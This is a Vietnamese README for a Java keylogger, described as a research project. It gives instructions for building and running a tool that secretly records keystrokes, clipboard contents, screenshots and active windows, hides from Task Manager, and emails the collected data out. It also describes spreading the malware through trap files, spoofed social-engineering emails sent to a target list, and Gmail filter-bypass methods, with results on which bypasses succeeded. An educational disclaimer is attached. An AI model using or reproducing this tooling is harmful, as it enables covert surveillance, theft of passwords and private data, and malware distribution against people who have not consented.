# KeyLogger Research Project

## Mô tả dự án

KeyLogger là một dự án nghiên cứu được phát triển bằng Java, tập trung vào việc nghiên cứu các kỹ thuật phát hiện và phòng chống phần mềm độc hại để bảo vệ hệ thống. Dự án này được tạo ra nhằm mục đích giáo dục và nghiên cứu bảo mật thông tin.

**CẢNH BÁO: Dự án này chỉ dành cho mục đích nghiên cứu và giáo dục. Việc sử dụng cho các mục đích bất hợp pháp là trái pháp luật.**

## Tính năng chính

### Tính năng giám sát cơ bản:
- **Keyboard Monitoring**: Giám sát và ghi lại tất cả phím bấm
- **Clipboard Monitoring**: Theo dõi hoạt động copy/paste
- **Screen Capturing**: Chụp ảnh màn hình tự động khi phát hiện các ứng dụng nhạy cảm
- **Window Monitoring**: Theo dõi các cửa sổ ứng dụng đang hoạt động
- **Stealth Mode**: Hoạt động ẩn, tránh bị phát hiện bởi Task Manager

### Tính năng báo cáo:
- **Email Reporting**: Gửi dữ liệu thu thập qua email tự động
- **Size-based Sending**: Gửi email khi đạt dung lượng tối đa (10MB)
- **Time-based Sending**: Gửi email theo chu kỳ thời gian (có thể cấu hình)
- **Data Compression**: Nén dữ liệu thành file ZIP trước khi gửi

### Tính năng lan truyền (Advanced):
- **Trap File Generation**: Tạo file bẫy tự động để lan truyền
- **Multiple Bypass Methods**: 6+ phương pháp bypass Gmail security
- **Social Engineering Templates**: Các mẫu email giả mạo chuyên nghiệp
- **File Format Evasion**: Đổi định dạng file để tránh phát hiện

## Cấu trúc dự án

```
KeyLogger/
├── src/                          # Source code chính
│   ├── Keylogger.java           # File chính để chạy chương trình  
│   ├── KeyListenerHandler.java   # Xử lý sự kiện bàn phím
│   ├── EmailSender.java         # Gửi email và file bẫy
│   ├── ClipboardMonitor.java    # Giám sát clipboard
│   ├── WindowMonitor.java       # Giám sát cửa sổ
│   ├── ScreenshotHandler.java   # Chụp ảnh màn hình
│   ├── LogFileHandler.java      # Xử lý file log
│   └── TrapFileDemo.java        # Demo các phương pháp bypass
├── libs/                        # Thư viện cần thiết
│   ├── jnativehook-2.2.2.jar   # Hook toàn cục
│   ├── javax.mail.jar           # Gửi email
│   ├── javax.activation.jar     # Hỗ trợ email
│   ├── jna-5.16.0.jar          # Java Native Access
│   ├── jna-platform-5.16.0.jar # JNA Platform
│   └── JNativeHook-2.2.2.x86_64.dll # Native library
├── .gitignore                   # Git ignore file
├── build.bat                    # Build script
├── run.bat                      # Run script
└── README.md                    # Tài liệu hướng dẫn
└── README.md                    # Tài liệu này
```

## Yêu cầu hệ thống

### Phần mềm cần thiết:
- **Java Development Kit (JDK)**: Version 8 trở lên
- **Hệ điều hành**: Windows 10/11 (64-bit)
- **Java Runtime Environment (JRE)**: Để chạy chương trình
- **Internet connection**: Để gửi email báo cáo

### Cấu hình tối thiểu:
- **RAM**: 2GB trở lên
- **Dung lượng**: 50MB trống
- **Quyền**: Administrator (để hook toàn cục)

## Hướng dẫn cài đặt

### Bước 1: Kiểm tra Java
```bash
java -version
javac -version
```
Nếu chưa có Java, tải và cài đặt từ: https://www.oracle.com/java/technologies/downloads/

### Bước 2: Tải dự án
```bash
git clone https://github.com/yourusername/KeyLogger.git
cd KeyLogger
```

### VS Code Setup (Khuyên dùng):
Nếu sử dụng VS Code, dự án đã có sẵn `.vscode/settings.json` với:
- Classpath đã config sẵn cho libs
- Source path đã setup cho src folder
- Auto-build configuration

### Bước 3: Build dự án

**Cách 1: Sử dụng build script (Đơn giản)**
```bash
build.bat
```

**Cách 2: Compile thủ công**
```bash
javac -encoding UTF-8 -cp ".;libs/*" -d bin src/*.java
```

### Bước 4: Cấu hình email
Mở file `src/EmailSender.java` và thay đổi:
```java
private static final String SENDER_EMAIL = "your-email@gmail.com";
private static final String APP_PASSWORD = "your-app-password";
private static final String RECIPIENT_EMAIL = "recipient@gmail.com";
```

**Lưu ý**: Cần tạo App Password trong Gmail, không dùng password thường.

## Hướng dẫn sử dụng

### Chạy KeyLogger cơ bản

**Cách 1: Sử dụng run script (Đơn giản)**
```bash
run.bat
```

**Cách 2: Chạy thủ công**
```bash
java -cp ".;bin;libs/*" Keylogger
```

#### Bước 2: Kiểm tra hoạt động
- Gõ phím trên bàn phím để test
- Copy/paste text để test clipboard
- Mở các ứng dụng khác nhau
- Truy cập trang web đăng nhập để test screenshot

#### Bước 3: Xem kết quả log
```bash
# Mở thư mục log
explorer "%TEMP%\window_update"

# Hoặc xem nội dung file log
type "%TEMP%\window_update\data.txt"
```

### Chạy demo tính năng bypass

#### Bước 1: Biên dịch demo
```bash
javac -encoding UTF-8 -cp "src;libs/*" TrapFileDemo.java
```

#### Bước 2: Xem các phương pháp có sẵn
```bash
java -cp ".;src;libs/*" TrapFileDemo
```

#### Bước 3: Chạy từng phương pháp
```bash
# Method 1: File ZIP (Đã test thành công)
java -cp ".;src;libs/*" TrapFileDemo 1

# Method 2: Link Google Drive giả
java -cp ".;src;libs/*" TrapFileDemo 2

# Method 3: File Base64 (Đã test thành công)  
java -cp ".;src;libs/*" TrapFileDemo 3

# Method 4: File Screensaver
java -cp ".;src;libs/*" TrapFileDemo 4

# Method 5: Chia file thành phần
java -cp ".;src;libs/*" TrapFileDemo 5

# Method 6: Ẩn trong ảnh
java -cp ".;src;libs/*" TrapFileDemo 6

# Method 7: Chọn ngẫu nhiên
java -cp ".;src;libs/*" TrapFileDemo 7

# Method 8: Tấn công tổng hợp
java -cp ".;src;libs/*" TrapFileDemo 8
```

## Cấu hình nâng cao

### Thay đổi thời gian gửi email
Trong file `src/Keylogger.java`, thay đổi:
```java
// Gửi khi đạt 10MB
EmailSender.monitorAndSend(10, "JKeyData", "Gửi định kỳ mỗi 10MB");

// Hoặc gửi mỗi 15 giây (bỏ comment)
EmailSender.sendFileAfterTime(15000, "JkeyData", "Gửi định kỳ mỗi 15s.");
```

### Thay đổi danh sách target
Trong file `src/EmailSender.java`, method `sendTrapToTargets()`:
```java
String[] targets = {
    "target1@gmail.com",
    "target2@gmail.com", 
    "target3@gmail.com"
};
```

### Tùy chỉnh email template
Sửa các biến `subject` và `content` trong các method gửi email.

## Xử lý lỗi thường gặp

### Lỗi "Could not find JNativeHook.x86_64.dll"
**Nguyên nhân**: Thiếu file DLL
**Giải pháp**: Tự động fix - Code sẽ tự copy từ libs/ folder khi cần
```bash
# Hoặc copy thủ công nếu cần:
copy "libs\JNativeHook-2.2.2.x86_64.dll" "JNativeHook.x86_64.dll"
```

### Lỗi "Cannot find symbol"
**Nguyên nhân**: Thiếu thư viện trong classpath
**Giải pháp**: Đảm bảo biên dịch với đúng classpath:
```bash
javac -encoding UTF-8 -cp "../libs/*" *.java
```

### Lỗi Gmail "Message blocked"
**Nguyên nhân**: Gmail phát hiện file độc hại
**Giải pháp**: Sử dụng các method bypass khác (1, 2, 3 đã test thành công)

### Lỗi encoding Unicode
**Nguyên nhân**: Windows không hỗ trợ UTF-8
**Giải pháp**: Luôn thêm `-encoding UTF-8` khi biên dịch

## Kết quả test bypass Gmail Security

### Thành công (3/6 methods):
1. **File ZIP**: 100% thành công - File 4.5MB được gửi
2. **Link + Guide**: 100% thành công - Email với hướng dẫn
3. **Base64 Text**: 100% thành công - File .txt được chấp nhận

### Bị chặn (2/6 methods):
4. **File .scr**: Gmail phát hiện screensaver độc hại
6. **Steganography**: Gmail phát hiện payload trong ảnh

### Chưa test đầy đủ (1/6 methods):
5. **Multiple Parts**: Chia file thành nhiều phần nhỏ

## Các file được tạo ra

### Log files:
- `%TEMP%\window_update\data.txt`: Log keyboard và window
- `%TEMP%\window_update\*.jpg`: Screenshots tự động

### Trap files (Temporary):
- `Document_Report.zip`: File bẫy ZIP (tự xóa sau khi gửi)
- `instructions.txt`: Hướng dẫn Base64 (temporary)
- `Download_Guide.txt`: Hướng dẫn tải file (temporary)

### Build files:
- `bin/`: Thư mục chứa file .class sau compile
- `JNativeHook.x86_64.dll`: Native library (auto-copied khi cần)

## Mục đích giáo dục

Dự án này được tạo ra để:
- **Nghiên cứu bảo mật**: Hiểu cách hoạt động của malware
- **Phát triển phòng thủ**: Tạo các biện pháp chống lại keylogger
- **Giáo dục**: Nâng cao nhận thức về an toàn thông tin
- **Penetration Testing**: Kiểm tra bảo mật hệ thống

## Tuyên bố trách nhiệm

**QUAN TRỌNG**: Dự án này chỉ dành cho mục đích nghiên cứu và giáo dục. Tác giả không chịu trách nhiệm về việc sử dụng sai mục đích. Người sử dụng phải tuân thủ pháp luật địa phương và chỉ sử dụng trên hệ thống thuộc quyền sở hữu của mình.

Việc sử dụng keylogger để theo dõi người khác mà không có sự đồng ý là bất hợp pháp trong hầu hết các quốc gia.

## Dừng và dọn dẹp

### Dừng KeyLogger:
```bash
# Tìm và dừng process Java
tasklist | findstr java
taskkill /F /PID <process_id>

# Hoặc dùng PowerShell
Get-Process -Name "java" | Stop-Process -Force
```

### Xóa dữ liệu đã thu thập:
```bash
# Xóa logs
rmdir /s /q "%TEMP%\window_update"

# Xóa compiled files
rmdir /s /q "bin"

# Xóa copied DLL
del "JNativeHook.x86_64.dll"
```

## Liên hệ

Nếu có câu hỏi về mục đích nghiên cứu hoặc cần hỗ trợ kỹ thuật, vui lòng tạo issue trong repository này.

---
**Phát triển cho mục đích giáo dục và nghiên cứu bảo mật thông tin**